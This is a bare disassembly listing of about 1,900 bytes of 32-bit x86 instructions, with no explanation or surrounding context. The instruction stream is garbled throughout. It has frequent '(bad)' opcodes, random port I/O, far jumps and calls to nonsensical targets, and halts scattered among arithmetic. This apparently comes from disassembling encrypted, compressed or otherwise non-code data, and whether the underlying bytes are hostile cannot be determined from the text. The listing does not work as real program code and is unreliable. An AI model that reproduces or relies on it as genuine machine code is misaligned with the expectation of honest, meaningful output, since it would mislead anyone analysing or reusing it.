  422fd5:	ds push ds
  422fd7:	jne    0x422f67
  422fd9:	loope  0x423018
  422fdb:	les    edi,FWORD PTR [ecx+0x58]
  422fde:	xor    edi,DWORD PTR [edx-0x55]
  422fe1:	test   DWORD PTR [edx+0xf9c4590],ebx
  422fe7:	(bad)  
  422fe8:	outs   dx,BYTE PTR ds:[esi]
  422fe9:	loop   0x423000
  422feb:	sbb    BYTE PTR [ebx],cl
  422fed:	xor    dh,ch
  422fef:	xchg   edi,eax
  422ff0:	addr16 enter 0x6a1f,0x3b
  422ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ff6:	in     eax,0xb7
  422ff8:	adc    edx,ecx
  422ffa:	or     DWORD PTR [edi-0x67ffc34],edi
  423000:	pop    es
  423001:	sbb    eax,0xb204326f
  423006:	dec    esi
  423007:	cmp    eax,0x70c69d
  42300c:	out    dx,al
  42300d:	push   es
  42300e:	test   BYTE PTR [esi+esi*2],0x62
  423012:	push   ss
  423013:	pop    es
  423014:	aas    
  423015:	jg     0x422ff0
  423017:	jmp    0x6fb80167
  42301c:	clc    
  42301d:	sub    eax,0xc5244380
  423022:	cld    
  423023:	push   edx
  423024:	leave  
  423025:	loop   0x422fe0
  423027:	and    DWORD PTR [edi-0x5efc530b],0x4921e578
  423031:	push   ebx
  423032:	add    BYTE PTR [eax-0x60b54ae1],dh
  423038:	push   0xffffff8b
  42303a:	xchg   edi,eax
  42303b:	dec    esp
  42303c:	push   ebx
  42303d:	es mov bl,0xed
  423040:	js     0x42302a
  423042:	inc    ecx
  423043:	test   eax,0x77388d70
  423048:	data16 loope 0x423078
  42304b:	dec    ebp
  42304c:	fild   QWORD PTR [ebp+0x266f1e7]
  423052:	aam    0x96
  423054:	inc    eax
  423055:	and    bh,BYTE PTR [edi-0x4bc421bc]
  42305b:	jmp    0x292c:0xf33d7189
  423062:	mov    DWORD PTR [edi+0x3a],0xd6004828
  423069:	or     eax,DWORD PTR [edi-0x7349d358]
  42306f:	scas   eax,DWORD PTR es:[edi]
  423070:	arpl   WORD PTR [ecx-0x60],sp
  423073:	dec    ebx
  423074:	cdq    
  423075:	out    0xe,al
  423077:	dec    ebx
  423078:	or     esp,DWORD PTR [ebx-0x57b6d668]
  42307e:	inc    edi
  42307f:	fidiv  WORD PTR [ebp+0x7a]
  423082:	and    al,BYTE PTR [ebp-0x47ac8355]
  423088:	cli    
  423089:	push   es
  42308a:	(bad)  
  42308b:	cli    
  42308c:	xor    BYTE PTR [edi-0x7e],bh
  42308f:	sbb    ecx,esp
  423091:	mov    ebx,0xda339d85
  423096:	push   edx
  423097:	(bad)
  42309a:	sub    ah,BYTE PTR [ecx]
  42309c:	pop    edx
  42309d:	xchg   edx,eax
  42309e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42309f:	shl    BYTE PTR [edi+edx*8-0x40],cl
  4230a3:	xor    DWORD PTR [ebx-0x5c064815],0x4b
  4230aa:	adc    al,0xc8
  4230ac:	out    0xa4,eax
  4230ae:	ret    0xbb70
  4230b1:	jns    0x4230a2
  4230b3:	adc    dl,al
  4230b5:	inc    edx
  4230b6:	and    edx,DWORD PTR [edi]
  4230b8:	cmp    eax,0x3ab37040
  4230bd:	mov    esp,0xf15c966b
  4230c2:	ror    BYTE PTR [ebp-0x4ae6d037],0x24
  4230c9:	ret    
  4230ca:	sahf   
  4230cb:	sub    eax,0x2e706812
  4230d0:	je     0x423080
  4230d2:	shl    DWORD PTR [eax],1
  4230d4:	scas   eax,DWORD PTR es:[edi]
  4230d5:	cmovg  edx,esi
  4230d8:	and    al,0x15
  4230da:	cdq    
  4230db:	xor    al,0x84
  4230dd:	add    ah,ah
  4230df:	sub    BYTE PTR ds:0x640db8c5,bh
  4230e5:	adc    DWORD PTR [ecx],ebx
  4230e7:	jae    0x423081
  4230e9:	dec    edi
  4230ea:	add    ch,BYTE PTR [esi+0xa]
  4230ed:	cs inc eax
  4230ef:	sub    al,BYTE PTR [esi-0x20]
  4230f2:	iret   
  4230f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230f4:	ja     0x42309c
  4230f6:	xor    BYTE PTR [ebp+eax*1+0x482d8f00],0xcf
  4230fe:	jns    0x42310d
  423100:	fadd   DWORD PTR [esi+0x3f]
  423103:	ins    DWORD PTR es:[edi],dx
  423104:	cli    
  423105:	daa    
  423106:	imul   esi,DWORD PTR [edx-0x5c2fb35c],0x1a87a429
  423110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423111:	xor    eax,0xf2e69d6b
  423116:	cmp    BYTE PTR [ebx+edx*8],bh
  423119:	aas    
  42311a:	dec    ecx
  42311b:	out    dx,eax
  42311c:	mov    ecx,0x9a94a96
  423121:	push   ebp
  423122:	dec    esp
  423123:	popf   
  423124:	stos   BYTE PTR es:[edi],al
  423125:	fistp  QWORD PTR [ecx-0x47803c82]
  42312b:	popa   
  42312c:	jno    0x423190
  42312e:	cmp    ch,BYTE PTR [edi+0xa]
  423131:	and    al,0x2e
  423133:	jae    0x423117
  423135:	sub    edx,DWORD PTR [ecx-0x3156c81b]
  42313b:	adc    al,0x9b
  42313d:	sbb    al,0x7f
  42313f:	test   al,0x4a
  423141:	and    bh,bh
  423143:	cmp    eax,0xf7b4b025
  423148:	in     al,0xb6
  42314a:	pop    es
  42314b:	cdq    
  42314c:	xchg   ebx,eax
  42314d:	sar    BYTE PTR ss:[ecx+0x2b2694c5],0xd1
  423155:	sti    
  423156:	ret    0xac83
  423159:	and    eax,0x2194ed1
  42315e:	or     al,0xc0
  423160:	clc    
  423161:	das    
  423162:	sbb    esp,esp
  423164:	xchg   ecx,eax
  423165:	pop    esp
  423166:	xchg   DWORD PTR [ebx+0x57d382f1],eax
  42316c:	lods   al,BYTE PTR ds:[esi]
  42316d:	ret    0x6a31
  423170:	jp     0x4231e0
  423172:	adc    DWORD PTR [ebx],esp
  423174:	push   ds
  423175:	retf   
  423176:	mov    ah,0x15
  423178:	inc    ebp
  423179:	sbb    DWORD PTR [ebp+0x1c21ef55],ebx
  42317f:	mov    WORD PTR [eax-0x23],?
  423182:	jne    0xd5de60e2
  423188:	sbb    cl,cl
  42318a:	jbe    0x4231c7
  42318c:	push   esi
  42318d:	jecxz  0x4231ca
  42318f:	mov    esi,0xfb1332ed
  423194:	fdivr  QWORD PTR [edi-0x2fd4f0e4]
  42319a:	mov    esi,0x9f18abcf
  42319f:	xchg   ebx,eax
  4231a0:	out    dx,eax
  4231a1:	inc    ecx
  4231a2:	inc    ebp
  4231a3:	push   ds
  4231a4:	inc    ecx
  4231a5:	imul   DWORD PTR [edi+ecx*4-0x60048e3d]
  4231ac:	ret    
  4231ad:	call   0xcc5e:0x5faa2315
  4231b4:	cld    
  4231b5:	jae    0x423173
  4231b7:	sbb    BYTE PTR [esi],dh
  4231b9:	adc    eax,0x95f7835b
  4231be:	jmp    0x42315a
  4231c0:	push   eax
  4231c1:	lods   al,BYTE PTR ds:[esi]
  4231c2:	mov    bh,0x6a
  4231c4:	cmp    dl,dl
  4231c6:	stc    
  4231c7:	mov    eax,cs:0x9ccc55c2
  4231cd:	aaa    
  4231ce:	xchg   ecx,eax
  4231cf:	outs   dx,BYTE PTR ds:[esi]
  4231d0:	push   ebx
  4231d1:	xlat   BYTE PTR ds:[ebx]
  4231d2:	in     eax,0x35
  4231d4:	mov    eax,0x3ccbaec5
  4231d9:	(bad)  
  4231da:	mov    al,0x89
  4231dc:	sahf   
  4231dd:	jb     0x4231e0
  4231df:	pop    ebp
  4231e0:	stos   DWORD PTR es:[edi],eax
  4231e1:	int    0xb4
  4231e3:	daa    
  4231e4:	push   0xf58d00a0
  4231e9:	dec    eax
  4231ea:	push   ecx
  4231eb:	jle    0x42320a
  4231ed:	xchg   ecx,eax
  4231ee:	push   edi
  4231ef:	cmp    ecx,edi
  4231f1:	pop    ss
  4231f2:	sbb    DWORD PTR [esi-0x7b7d4bbd],ecx
  4231f8:	adc    dl,BYTE PTR [edi+0x5]
  4231fb:	push   edx
  4231fc:	add    eax,0xec1bc593
  423201:	fwait
  423202:	aas    
  423203:	das    
  423204:	mov    ah,0xea
  423206:	dec    esi
  423207:	xchg   ch,dl
  423209:	test   eax,0xe15e1d13
  42320e:	pop    eax
  42320f:	jg     0x4231df
  423211:	dec    edx
  423212:	cmp    eax,0x6b61c338
  423217:	pusha  
  423218:	inc    ebp
  423219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42321a:	mov    al,ds:0xebd27e9d
  42321f:	jnp    0x42322c
  423221:	pop    esp
  423222:	hlt    
  423223:	and    al,0x41
  423225:	mov    eax,0x5e4030a0
  42322a:	cmp    eax,0x1a79704c
  42322f:	aas    
  423230:	(bad)  
  423231:	push   cs
  423232:	push   0x90e18139
  423237:	scas   al,BYTE PTR es:[edi]
  423238:	fistp  DWORD PTR [ebx]
  42323a:	fs push ds
  42323c:	test   BYTE PTR [ebx+ebx*1+0x71],dh
  423240:	xor    BYTE PTR [edi-0x7775c795],ch
  423246:	icebp  
  423247:	enter  0x5376,0xb2
  42324b:	and    DWORD PTR [ecx-0xc333efc],ecx
  423251:	jne    0x4232ad
  423253:	and    edi,DWORD PTR [edi+eax*1+0x78afef3e]
  42325a:	fnstenv [edx]
  42325c:	aam    0x8e
  42325e:	pop    ebp
  42325f:	gs (bad) 
  423261:	repz sbb BYTE PTR [ebp-0x78],0xf9
  423266:	or     BYTE PTR [ecx-0x19],ch
  423269:	add    BYTE PTR [ecx],bl
  42326b:	frstor [eax-0x29]
  42326e:	or     DWORD PTR [edx+eiz*8+0x66239dd6],edx
  423275:	cmp    DWORD PTR [eax],ebp
  423277:	xor    al,0x4f
  423279:	inc    ecx
  42327a:	add    edi,DWORD PTR [ecx+0x2b0999f2]
  423280:	jl     0x42326d
  423282:	jecxz  0x423221
  423284:	push   0xcd3ef791
  423289:	xor    cl,BYTE PTR [esi+ebx*2-0x4f]
  42328d:	nop
  42328e:	(bad)  
  42328f:	pop    eax
  423290:	or     esp,esi
  423292:	pop    es
  423293:	icebp  
  423294:	fwait
  423295:	inc    edx
  423296:	hlt    
  423297:	inc    eax
  423298:	rol    BYTE PTR [ebp+0x69],0xe4
  42329c:	xor    eax,DWORD PTR [eax+eax*1-0x3a64930f]
  4232a3:	and    al,0x3b
  4232a5:	das    
  4232a6:	ficomp WORD PTR [edi+0x11c85f1f]
  4232ac:	in     al,0x14
  4232ae:	add    al,BYTE PTR [esi-0x77b62546]
  4232b4:	iret   
  4232b5:	add    BYTE PTR [eax],0xcb
  4232b8:	push   ds
  4232b9:	in     al,dx
  4232ba:	sub    al,0xa5
  4232bc:	ins    DWORD PTR es:[edi],dx
  4232bd:	cwde   
  4232be:	test   eax,0x3c31077e
  4232c3:	in     al,dx
  4232c4:	mov    ah,0xd9
  4232c6:	dec    edx
  4232c7:	pop    ecx
  4232c8:	repnz cmp eax,0x532bf328
  4232ce:	nop
  4232cf:	inc    ebx
  4232d0:	mov    ch,0xde
  4232d2:	or     BYTE PTR [ecx+ecx*4],cl
  4232d5:	shr    BYTE PTR ds:0x9c6afe41,cl
  4232db:	data16 int 0xef
  4232de:	sbb    eax,0x3a019cf3
  4232e3:	test   al,0xf8
  4232e5:	dec    edx
  4232e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232e7:	data16 sub cl,ch
  4232ea:	mov    ah,0x23
  4232ec:	enterw 0xcdf0,0xed
  4232f1:	adc    al,0xf2
  4232f3:	jae    0x423334
  4232f5:	add    DWORD PTR [ebp+0x34da4736],eax
  4232fb:	dec    edi
  4232fc:	pushf  
  4232fd:	pop    ds
  4232fe:	jecxz  0x4232c5
  423300:	sub    BYTE PTR [esi+ebx*1-0x68ec23ce],bl
  423307:	adc    DWORD PTR [ecx],0x62d910a1
  42330d:	or     eax,0xfae4e3bb
  423312:	fld    DWORD PTR [edi+ecx*2+0x3c2288]
	...
  423321:	cli    
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0x1f
  42332e:	sbb    bh,bl
  423330:	pusha  
  423331:	push   cs
  423332:	lods   al,BYTE PTR ds:[esi]
  423333:	add    DWORD PTR [eax],eax
  423335:	scas   eax,DWORD PTR es:[edi]
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    BYTE PTR [eax+0x7402fd8e],dl
  42333e:	or     edi,esp
  423340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423341:	add    eax,0xe6337dca
  423346:	pop    esp
  423347:	cmp    DWORD PTR [eax],esp
  423349:	enter  0x17f5,0xec
  42334d:	fidivr WORD PTR [edi-0x6]
  423350:	test   BYTE PTR [edi+ecx*1-0x4d],bh
  423354:	and    dl,BYTE PTR [ebx]
  423356:	leave  
  423357:	(bad)  
  423358:	popa   
  423359:	push   0x10
  42335b:	imul   esi,DWORD PTR [edi],0x39909502
  423361:	adc    dl,dl
  423363:	mov    esp,0x1533aeb2
  423368:	test   eax,0x13d9b677
  42336d:	adc    cl,BYTE PTR [edi+0x65]
  423370:	add    BYTE PTR [edi],bl
  423372:	pop    ecx
  423373:	into   
  423374:	iret   
  423375:	and    esp,DWORD PTR [edx]
  423377:	push   ebx
  423378:	jmp    0x2ee9:0x391530b8
  42337f:	popf   
  423380:	sahf   
  423381:	call   0x664c3908
  423386:	dec    esi
  423387:	mov    dh,0x91
  423389:	dec    ebp
  42338a:	mov    edi,0x54c3a1f6
  42338f:	sub    esp,DWORD PTR [edi-0x8c030b0]
  423395:	addr16 in al,dx
  423397:	jbe    0x423361
  423399:	xchg   edx,eax
  42339a:	mov    esi,0x25ada2a
  42339f:	(bad)  
  4233a0:	cmc    
  4233a1:	in     eax,dx
  4233a2:	dec    ecx
  4233a3:	or     DWORD PTR [ebp+0x7e],ebp
  4233a6:	popf   
  4233a7:	mov    edi,0xbb585210
  4233ac:	out    dx,al
  4233ad:	call   0xb2b78204
  4233b2:	jnp    0x423387
  4233b4:	dec    edi
  4233b5:	mov    ecx,0xec2c62fd
  4233ba:	xchg   DWORD PTR [edi],ecx
  4233bc:	or     BYTE PTR [ebp+eiz*1-0x75ae4a80],bh
  4233c3:	pop    edi
  4233c4:	dec    esi
  4233c5:	(bad)  [esi+ebp*8]
  4233c8:	aaa    
  4233c9:	clc    
  4233ca:	mov    dl,0xf5
  4233cc:	dec    ebx
  4233cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233ce:	xchg   BYTE PTR [ebp-0x79],ch
  4233d1:	jb     0x4233ef
  4233d3:	scas   eax,DWORD PTR es:[edi]
  4233d4:	dec    edx
  4233d5:	(bad)  [edx-0x4b2d0732]
  4233db:	sub    eax,0x3a105e44
  4233e0:	fst    QWORD PTR [ebx-0x389ae24f]
  4233e6:	push   edi
  4233e7:	call   0xe66bf5e
  4233ec:	pop    edi
  4233ed:	or     DWORD PTR [edi],esi
  4233ef:	ss aam 0x6e
  4233f2:	popa   
  4233f3:	fs je  0x423408
  4233f6:	arpl   WORD PTR [esi+0x1e],di
  4233f9:	cwde   
  4233fa:	dec    edx
  4233fb:	add    ah,BYTE PTR [edx-0x78f663a0]
  423401:	lods   eax,DWORD PTR ds:[esi]
  423402:	test   DWORD PTR [esi+eax*8-0x5],esp
  423406:	(bad)  [eax]
  423408:	pushf  
  423409:	mov    al,ds:0x525d8321
  42340e:	imul   esi,edi,0x3b
  423411:	data16 test al,0x3a
  423415:	pop    eax
  423416:	in     eax,dx
  423417:	addr16 jl 0x42339b
  42341a:	jb     0x4233c1
  42341c:	popa   
  42341d:	xor    DWORD PTR [edi+0x7],esp
  423420:	fs cld 
  423422:	xchg   al,dl
  423424:	xchg   esp,eax
  423425:	das    
  423426:	jne    0x42347f
  423428:	clc    
  423429:	jmp    ecx
  42342b:	mov    ds:0x90226b03,al
  423430:	xchg   esp,eax
  423431:	jmp    0xa33265e4
  423436:	xor    al,0xc
  423438:	(bad)  
  42343a:	add    eax,0xa1577133
  42343f:	(bad)  
  423440:	psubd  mm3,QWORD PTR [edi]
  423443:	icebp  
  423444:	sti    
  423445:	xchg   BYTE PTR [edx-0x4f],bh
  423448:	inc    esp
  423449:	faddp  st(3),st
  42344b:	fs add dh,cl
  42344e:	into   
  42344f:	aaa    
  423450:	mov    edx,0x325ccbff
  423455:	pop    esi
  423456:	mov    edi,0xb71140c4
  42345b:	and    dl,BYTE PTR [esi+0x13]
  42345e:	in     eax,dx
  42345f:	jecxz  0x4234d8
  423461:	lds    eax,FWORD PTR [edi+0xa88a3cb]
  423467:	xor    eax,0x9ca36907
  42346c:	mov    WORD PTR [ebx-0x1],gs
  42346f:	sar    DWORD PTR [esi+0xc27126b],cl
  423475:	inc    ebx
  423476:	(bad)  
  423477:	ds cmp dl,ah
  42347a:	(bad)
  42347e:	ja     0x4234cb
  423480:	ds mov esp,0xb4f3b78c
  423486:	test   dh,ch
  423488:	mov    dh,0x6e
  42348a:	pop    edx
  42348b:	lods   eax,DWORD PTR ds:[esi]
  42348c:	add    BYTE PTR [ecx],bl
  42348e:	pop    esi
  42348f:	aam    0x7c
  423491:	fist   WORD PTR [ebx]
  423493:	aam    0xed
  423495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423496:	daa    
  423497:	sub    esi,DWORD PTR [edx+0x12]
  42349a:	jae    0x423486
  42349c:	lods   eax,DWORD PTR ds:[esi]
  42349d:	inc    ecx
  42349e:	repz push 0x548b855a
  4234a4:	call   0x36be2415
  4234a9:	sti    
  4234aa:	mov    dh,0xcf
  4234ac:	pop    ebx
  4234ad:	push   esi
  4234ae:	push   edx
  4234af:	retf   0x3824
  4234b2:	retf   0x3694
  4234b5:	inc    ecx
  4234b6:	and    BYTE PTR [ecx-0x23229163],0xc1
  4234bd:	add    eax,0xc65c9bc1
  4234c2:	call   0x8a4e:0x24f2a129
  4234c9:	bound  ebx,QWORD PTR [ebx+0x4702f479]
  4234cf:	call   0x9e8c:0xc371aabf
  4234d6:	(bad)  
  4234d7:	iret   
  4234d8:	arpl   sp,sp
  4234da:	test   eax,0x165b6fdf
  4234df:	cmp    BYTE PTR [ebx+0x5c],bh
  4234e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234e3:	(bad)  [edx+0x64]
  4234e6:	gs or  al,0xb0
  4234e9:	data16 cmp al,0x36
  4234ec:	dec    esp
  4234ed:	sar    DWORD PTR [ecx+0x34],1
  4234f0:	inc    DWORD PTR [esi-0x76]
  4234f3:	mov    bl,0x2f
  4234f5:	(bad)  
  4234f6:	sbb    eax,0x57f266b7
  4234fb:	sub    al,0xf
  4234fd:	pop    ebp
  4234fe:	out    0x20,al
  423500:	jnp    0x42351f
  423502:	xor    al,0x3f
  423504:	popf   
  423505:	pop    esp
  423506:	std    
  423507:	sar    DWORD PTR [edx+0x70],0x6
  42350b:	xchg   esi,eax
  42350c:	jp     0x423521
  42350e:	xor    esi,ebx
  423510:	jb     0x42356e
  423512:	nop
  423513:	sub    esp,ebx
  423515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423516:	fbld   TBYTE PTR [esi]
  423518:	pop    edi
  423519:	add    BYTE PTR [eax+0x7f02792a],al
  42351f:	mov    eax,ds:0xd7fa4de1
  423524:	addr16 mov cl,0xb9
  423527:	xor    bl,dl
  423529:	inc    ebx
  42352a:	pop    edi
  42352b:	inc    ebx
  42352c:	test   eax,0xf8bd38c6
  423531:	cmp    DWORD PTR [edx],ebx
  423533:	mov    edx,0x47791001
  423538:	xchg   ebx,eax
  423539:	es cwde 
  42353b:	and    eax,0x3b850d6e
  423540:	mov    esi,0xa7b500af
  423545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423546:	mov    dh,0xd4
  423548:	fprem  
  42354a:	jo     0x423587
  42354c:	xchg   edx,eax
  42354d:	cmp    BYTE PTR [esi],bl
  42354f:	sti    
  423550:	shl    BYTE PTR [ecx-0x7cbbea95],cl
  423556:	bound  edx,QWORD PTR [ecx]
  423558:	mov    ebx,0xca257bd
  42355d:	bound  esp,QWORD PTR [ecx+0x565fa477]
  423563:	pop    es
  423564:	retf   0xf443
  423567:	push   edi
  423568:	inc    esi
  423569:	or     eax,0xc211ff66
  42356e:	jns    0x42355c
  423570:	scas   al,BYTE PTR es:[edi]
  423571:	scas   al,BYTE PTR es:[edi]
  423572:	stos   BYTE PTR es:[edi],al
  423573:	cmp    DWORD PTR [edi],esp
  423575:	out    0x66,eax
  423577:	dec    ebp
  423578:	inc    edi
  423579:	dec    ebp
  42357a:	pop    ecx
  42357b:	xchg   BYTE PTR [edx+eax*2],dl
  42357e:	in     eax,0xe6
  423580:	xlat   BYTE PTR ds:[ebx]
  423581:	sub    DWORD PTR [eax],edi
  423583:	out    dx,al
  423584:	jb     0x4235ff
  423586:	push   cs
  423587:	icebp  
  423588:	imul   ebx,DWORD PTR [ebp+0xe],0xd0cbbdae
  42358f:	or     ecx,DWORD PTR [ebx+0x70]
  423592:	sub    BYTE PTR [ebp+0x59],0x65
  423596:	add    ebp,DWORD PTR [eax+esi*4-0x7]
  42359a:	bnd jns 0x4235d9
  42359d:	dec    ebx
  42359e:	add    eax,0x2c2ea762
  4235a3:	fmul   st,st(6)
  4235a5:	loopne 0x42352f
  4235a7:	retf   
  4235a8:	(bad)  
  4235a9:	je     0x423606
  4235ab:	push   cs
  4235ac:	int3   
  4235ad:	cmp    esi,DWORD PTR [esi]
  4235af:	rol    BYTE PTR [eax-0x61],0x25
  4235b3:	nop
  4235b4:	jno    0x423585
  4235b6:	ja     0x42358e
  4235b8:	aas    
  4235b9:	cmp    eax,0xbf66d7c1
  4235be:	inc    ecx
  4235bf:	(bad)  
  4235c2:	xchg   ebx,eax
  4235c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235c4:	in     al,0x14
  4235c6:	in     eax,dx
  4235c7:	dec    esi
  4235c8:	and    bh,BYTE PTR [edi-0x4e]
  4235cb:	fs mov ah,0x56
  4235ce:	sbb    BYTE PTR [ebx-0x492e8c5a],dl
  4235d4:	lahf   
  4235d5:	pop    es
  4235d6:	(bad)  
  4235d7:	in     eax,dx
  4235d8:	xchg   esp,eax
  4235d9:	(bad)  
  4235db:	add    dh,BYTE PTR [ebx+0x28b88240]
  4235e1:	popa   
  4235e2:	push   cs
  4235e3:	mov    eax,0x34c56a8e
  4235e8:	sbb    dh,ah
  4235ea:	sub    al,0xca
  4235ec:	jbe    0x42364b
  4235ee:	and    cl,BYTE PTR [esi-0x4d]
  4235f1:	mov    edx,0xa382a3bf
  4235f6:	(bad)  
  4235f7:	das    
  4235f8:	test   BYTE PTR [ecx],bl
  4235fa:	push   ds
  4235fb:	jmp    0x10fc:0xb3494c94
  423602:	std    
  423603:	lods   al,BYTE PTR ds:[esi]
  423604:	and    cl,BYTE PTR [ebx-0x6e]
  423607:	retf   
  423608:	call   0x776d:0x1e883634
  42360f:	jp     0x423685
  423611:	repnz jecxz 0x42360b
  423614:	lods   eax,DWORD PTR ds:[esi]
  423615:	adc    al,0xc5
  423617:	jg     0x4235db
  423619:	(bad)  [edi-0x2086ee36]
  42361f:	push   cs
  423620:	mul    DWORD PTR [edx]
  423622:	ss pop ebx
  423624:	cmc    
  423625:	fcomp  QWORD PTR [edx+0x7b]
  423628:	pop    ecx
  423629:	sub    eax,0xbf7b5c8a
  42362e:	fsubp  st(4),st
  423630:	scas   eax,DWORD PTR es:[edi]
  423631:	xchg   edi,eax
  423632:	mov    ebx,0x3a98d69f
  423637:	push   esp
  423638:	outs   dx,BYTE PTR ds:[esi]
  423639:	ins    BYTE PTR es:[edi],dx
  42363a:	add    al,0x33
  42363c:	icebp  
  42363d:	aad    0xdb
  42363f:	in     eax,0x0
  423641:	data16 loopne 0x423661
  423644:	dec    edi
  423645:	adc    DWORD PTR [edi],eax
  423647:	add    dh,BYTE PTR [edx+0x24]
  42364a:	scas   al,BYTE PTR es:[edi]
  42364b:	push   edx
  42364c:	sar    BYTE PTR [esi+0x5d],1
  42364f:	fnstcw WORD PTR [eax-0x6]
  423652:	ficom  DWORD PTR [eax]
  423654:	mov    ds,WORD PTR [ebp+0x3758847e]
  42365a:	shl    BYTE PTR [eax-0x4eb80229],0x94
  423661:	ret    
  423662:	daa    
  423663:	and    DWORD PTR ds:0xbb8662e6,esp
  423669:	xor    eax,0xea822c77
  42366e:	xlat   BYTE PTR ds:[ebx]
  42366f:	jmp    0x16976621
  423674:	mov    ah,0xf2
  423676:	adc    ebp,DWORD PTR [eax-0x4540b264]
  42367c:	mov    esp,0xd7aaab78
  423681:	xor    al,0xcd
  423683:	or     al,BYTE PTR [ebp+0xef21018]
  423689:	push   es
  42368a:	xor    BYTE PTR [edx+0x60cab059],0xf3
  423691:	sbb    BYTE PTR [ebp-0x39],ch
  423694:	pop    ebp
  423695:	xchg   ecx,eax
  423696:	dec    ebx
  423697:	mov    esi,0xaf444ee6
  42369c:	and    ebx,DWORD PTR [edx+0x78]
  42369f:	mov    eax,ebp
  4236a1:	pop    ds
  4236a2:	stc    
  4236a3:	je     0x4236ac
  4236a5:	rcr    bh,cl
  4236a7:	scas   al,BYTE PTR es:[edi]
  4236a8:	pop    edx
  4236a9:	shl    DWORD PTR [esi+0x32],1
  4236ac:	sub    al,0x41
  4236ae:	push   eax
  4236af:	mov    bl,dl
  4236b1:	or     esi,DWORD PTR [ecx+0x15]
  4236b4:	xchg   esp,eax
  4236b5:	mov    esp,0xb9d30fec
  4236ba:	in     al,dx
  4236bb:	adc    ah,BYTE PTR [edi]
  4236bd:	inc    edi
  4236be:	popf   
  4236bf:	mov    ecx,ss
  4236c1:	mul    DWORD PTR [eax-0x13773930]
  4236c7:	lods   al,BYTE PTR ds:[esi]
  4236c8:	adc    al,0xdd
  4236ca:	rcr    DWORD PTR [ebp-0x1e],1
  4236cd:	push   edx
  4236ce:	jmp    0x3d32:0x5cbd3b04
  4236d5:	repnz lds edi,FWORD PTR [ebp+0x58]
  4236d9:	(bad)  
  4236da:	repnz mov esp,0x570db6e2
  4236e0:	ret    
  4236e1:	emms   
  4236e3:	xor    al,0x40
  4236e5:	add    al,BYTE PTR [ebx]
  4236e7:	add    BYTE PTR ds:[eax],al
  4236ea:	add    BYTE PTR [eax],al
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	add    BYTE PTR [eax],al
  4236f0:	add    BYTE PTR [esi+eiz*2],bl
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x79165c0c],dh
  423701:	mov    ebp,0xaf0001af
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    BYTE PTR [edi-0x74],dh
  42370b:	mov    dl,0xd8
  42370d:	cld    
  42370e:	add    al,BYTE PTR [eax+0x67]
  423711:	in     al,0x70
  423713:	sbb    al,BYTE PTR [edx-0x17]
  423716:	mov    eax,ds:0x9e002b2f
  42371b:	lds    edx,FWORD PTR [ebp-0x7d]
  42371e:	ja     0x4236d8
  423720:	inc    edi
  423721:	inc    ecx
  423723:	xcrypt-ctr (bad)
  423724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423725:	pop    ebx
  423726:	bound  esi,QWORD PTR [ebx+0x8d8bbd1]
  42372c:	adc    dh,BYTE PTR [ebp-0x5723974a]
  423732:	pop    ebx
  423733:	jle    0x423734
  423735:	mov    al,ds:0x26625e7c
  42373a:	loop   0x4237a9
  42373c:	shr    BYTE PTR [eax-0x2adff019],cl
  423742:	fstp   DWORD PTR [edx-0x2a]
  423745:	stc    
  423746:	or     DWORD PTR [esi+0x56],ecx
  423749:	xor    al,BYTE PTR [esi+esi*2]
  42374c:	popa   
  42374d:	push   0x900cb4e6
  423752:	and    edi,DWORD PTR [edi+ebp*2+0x37c7e06c]
  423759:	mov    edi,DWORD PTR [edi]
  42375b:	shl    DWORD PTR [edi],cl
  42375d:	xor    ebx,edi
  42375f:	pop    edx
  423760:	popa   
  423761:	sbb    BYTE PTR [esi],0xed
  423764:	arpl   WORD PTR [edi+0xeaf6ff3],si
  42376a:	mov    ss,WORD PTR [ecx-0x27]
  42376d:	and    al,0x20
  42376f:	pop    edi
  423770:	cs mov ch,0x10
  423773:	xchg   BYTE PTR [ebp-0x22],dl
  423776:	fwait
  423777:	sti    
  423778:	lea    ecx,[eax]
  42377a:	and    eax,0x843f3e76
  42377f:	cmp    eax,0x4b3a8263
  423784:	test   BYTE PTR [edi+0x30],dl
  423787:	ror    ah,0x52
  42378a:	and    eax,0x8b5a6da7
  42378f:	test   DWORD PTR [ebp+0x50],edi
  423792:	cmp    BYTE PTR [edx+eax*4],0xd4
  423796:	mov    WORD PTR [edx],gs
  423798:	out    0x96,al
  42379a:	xchg   BYTE PTR [ebx],ah
  42379c:	mov    ss,edx
  42379e:	adc    BYTE PTR [edx+0x7e],dh
  4237a1:	or     ah,cl
  4237a3:	lods   al,BYTE PTR ds:[esi]
  4237a4:	lods   eax,DWORD PTR ds:[esi]
  4237a5:	addr16 dec ebp
  4237a7:	ins    DWORD PTR es:[edi],dx
  4237a8:	or     esi,DWORD PTR [ebx]
  4237aa:	push   0x7e
  4237ac:	(bad)  
  4237ae:	add    eax,0xe8abe3dc
  4237b3:	jg     0x423809
  4237b5:	ja     0x42375c
  4237b7:	iret   
  4237b8:	push   ds
  4237b9:	mov    dl,0xb1
  4237bb:	sbb    ebx,ebx
  4237bd:	(bad)  
  4237be:	ror    DWORD PTR [esi-0xba973ac],cl
  4237c4:	das    
